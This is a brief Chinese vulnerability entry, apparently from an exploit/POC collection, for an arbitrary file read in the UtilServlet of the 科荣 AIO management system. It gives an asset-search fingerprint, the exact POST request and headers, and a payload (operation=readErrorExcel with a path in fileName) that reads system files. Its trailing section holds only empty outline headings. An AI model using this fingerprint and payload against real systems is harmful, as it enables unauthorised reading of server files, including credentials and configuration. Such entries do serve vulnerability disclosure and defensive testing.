# 科荣AIO管理系统UtilServlet存在任意文件读取漏洞

- **系统**：科荣AIO管理系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="科荣 AIO"`
- **请求**：`POST /UtilServlet HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 52`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
operation=readErrorExcel&fileName=C:\windows/win.ini
```

**其他**
- 科荣 AIO 管理系统 UtilServlet 存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 科荣 AIO 管理系统